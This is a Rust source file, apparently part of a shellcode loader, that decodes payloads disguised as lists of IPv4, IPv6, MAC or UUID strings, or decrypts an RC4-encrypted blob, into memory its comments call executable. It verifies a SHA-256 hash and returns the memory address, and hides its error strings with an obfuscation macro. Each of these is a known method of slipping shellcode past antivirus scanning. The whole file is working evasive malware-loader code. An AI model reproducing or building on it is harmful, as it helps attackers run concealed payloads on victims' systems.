use crate::alloc_mem::alloc_mem;

// IPv4 解密
#[cfg(feature = "decrypt_ipv4")]
#[allow(dead_code)]
pub unsafe fn decrypt(decoded: &[u8]) -> Result<usize, String> {
    use sha2::{Sha256, Digest};
    use rustcrypt_ct_macros::obf_lit;
    let hash_len = 32;
    let len_len = 4;
    if decoded.len() < hash_len + len_len {
        return Err(obf_lit!("ipv4 payload too short").to_string());
    }
    let hash = &decoded[0..hash_len];
    let len_bytes = &decoded[hash_len..hash_len + len_len];
    let original_len = u32::from_le_bytes([len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3]]) as usize;
    let addresses_str = std::str::from_utf8(&decoded[hash_len + len_len..]).map_err(|_| obf_lit!("invalid utf8").to_string())?;
    let addresses: Vec<&str> = addresses_str.split(',').collect();
    // 分配内存，直接在内存上还原
    let p = unsafe { alloc_mem(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    'outer: for addr_str in addresses {
        let parts: Vec<&str> = addr_str.split('.').collect();
        if parts.len() != 4 { return Err(obf_lit!("Invalid IPv4 address").to_string()); }
        for p in parts {
            if idx >= original_len { break 'outer; }
            let b = p.parse::<u8>().map_err(|_| obf_lit!("Invalid IPv4 byte").to_string())?;
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("ipv4 hash mismatch").to_string());
    }
    Ok(p as usize)
}

// IPv6 解密
#[cfg(feature = "decrypt_ipv6")]
#[allow(dead_code)]
pub unsafe fn decrypt(decoded: &[u8]) -> Result<usize, String> {
    use sha2::{Sha256, Digest};
    use rustcrypt_ct_macros::obf_lit;
    let hash_len = 32;
    let len_len = 4;
    if decoded.len() < hash_len + len_len {
        return Err(obf_lit!("ipv6 payload too short").to_string());
    }
    let hash = &decoded[0..hash_len];
    let len_bytes = &decoded[hash_len..hash_len + len_len];
    let original_len = u32::from_le_bytes([len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3]]) as usize;
    let addresses_str = std::str::from_utf8(&decoded[hash_len + len_len..]).map_err(|_| obf_lit!("invalid utf8").to_string())?;
    let addresses: Vec<&str> = addresses_str.split(',').collect();
    let p = unsafe { alloc_mem(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    'outer: for addr_str in addresses {
        let parts: Vec<&str> = addr_str.split(':').collect();
        if parts.len() != 8 { return Err(obf_lit!("Invalid IPv6 address").to_string()); }
        for p in parts {
            if idx + 1 >= original_len { break 'outer; }
            let v = u16::from_str_radix(p, 16).map_err(|_| obf_lit!("Invalid IPv6 segment").to_string())?;
            let bytes = v.to_be_bytes();
            if idx < original_len { buf[idx] = bytes[0]; idx += 1; }
            if idx < original_len { buf[idx] = bytes[1]; idx += 1; }
        }
    }
    // 验证哈希
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("ipv6 hash mismatch").to_string());
    }
    Ok(p as usize)
}

// UUID 解密
#[cfg(feature = "decrypt_uuid")]
#[allow(dead_code)]
pub unsafe fn decrypt(decoded: &[u8]) -> Result<usize, String> {
    use sha2::{Sha256, Digest};
    use rustcrypt_ct_macros::obf_lit;
    let hash_len = 32;
    let len_len = 4;
    if decoded.len() < hash_len + len_len {
        return Err(obf_lit!("uuid payload too short").to_string());
    }
    let hash = &decoded[0..hash_len];
    let len_bytes = &decoded[hash_len..hash_len + len_len];
    let original_len = u32::from_le_bytes([len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3]]) as usize;
    let uuids_str = std::str::from_utf8(&decoded[hash_len + len_len..]).map_err(|_| obf_lit!("invalid utf8").to_string())?;
    let uuids: Vec<&str> = uuids_str.split(',').collect();
    // 分配可执行内存
    let p = unsafe { alloc_mem(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    for uuid_str in uuids {
        let u = uuid::Uuid::parse_str(uuid_str).map_err(|_| obf_lit!("Invalid UUID").to_string())?;
        let bytes = u.as_bytes();
        for &b in bytes {
            if idx >= original_len { break; }
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("uuid hash mismatch").to_string());
    }
    Ok(p as usize)
}
// MAC 解密
#[cfg(feature = "decrypt_mac")]
#[allow(dead_code)]
pub unsafe fn decrypt(decoded: &[u8]) -> Result<usize, String> {
    use sha2::{Sha256, Digest};
    use rustcrypt_ct_macros::obf_lit;
    let hash_len = 32;
    let len_len = 4;
    if decoded.len() < hash_len + len_len {
        return Err(obf_lit!("mac payload too short").to_string());
    }
    let hash = &decoded[0..hash_len];
    let len_bytes = &decoded[hash_len..hash_len + len_len];
    let original_len = u32::from_le_bytes([len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3]]) as usize;
    let addresses_str = std::str::from_utf8(&decoded[hash_len + len_len..]).map_err(|_| obf_lit!("invalid utf8").to_string())?;
    let addresses: Vec<&str> = addresses_str.split(',').collect();
    // 分配可执行内存
    let p = unsafe { alloc_mem(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    'outer: for mac_str in addresses {
        let parts: Vec<&str> = mac_str.split('-').collect();
        if parts.len() != 6 { return Err(obf_lit!("Invalid MAC address").to_string()); }
        for p in parts {
            if idx >= original_len { break 'outer; }
            let b = u8::from_str_radix(p, 16).map_err(|_| obf_lit!("Invalid MAC byte").to_string())?;
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("mac hash mismatch").to_string());
    }
    Ok(p as usize)
}

// RC4 解密
#[cfg(feature = "decrypt_rc4")]
#[allow(dead_code)]
pub unsafe fn decrypt(decoded: &[u8]) -> Result<usize, String> {
    use rustcrypt_ct_macros::obf_lit;
    use rc4::{Rc4, StreamCipher, KeyInit};
    use generic_array::{GenericArray, typenum::U32};
    use sha2::{Sha256, Digest};
    let key_len = 32;
    let hash_len = 32;
    if decoded.len() < key_len + hash_len + 1 {
        return Err(obf_lit!("rc4 payload too short").to_string());
    }
    let key = &decoded[0..key_len];
    let hash = &decoded[key_len..key_len + hash_len];
    let encrypted = &decoded[key_len + hash_len..];
    let p = unsafe { alloc_mem(encrypted.len())? };
    std::ptr::copy_nonoverlapping(encrypted.as_ptr(), p, encrypted.len());
    let buf = std::slice::from_raw_parts_mut(p, encrypted.len());
    let key_array: &GenericArray<u8, U32> = GenericArray::from_slice(key);
    let mut cipher = Rc4::new(key_array);
    cipher.apply_keystream(buf);
    let mut hasher = Sha256::new();
    hasher.update(buf);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("rc4 hash mismatch").to_string());
    }
    Ok(p as usize) // 返回可执行内存地址
}